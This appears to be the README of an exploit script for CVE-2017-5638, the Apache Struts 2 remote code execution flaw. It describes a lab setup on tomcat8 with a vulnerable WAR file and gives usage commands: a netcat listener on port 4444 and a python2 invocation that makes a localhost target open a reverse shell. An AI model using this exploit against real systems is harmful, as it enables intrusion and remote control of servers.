# CVE-2017-5638
Apache Struts 2 Vulnerability Remote Code Execution

Reverse shell from target

Author: anarc0der - github.com/anarcoder

Tested with tomcat8

Install tomcat8

Deploy WAR file https://github.com/nixawk/labs/tree/master/CVE-2017-5638

Ex:

Open: $ nc -lnvp 4444

python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --ip=127.0.0.1 --port=4444
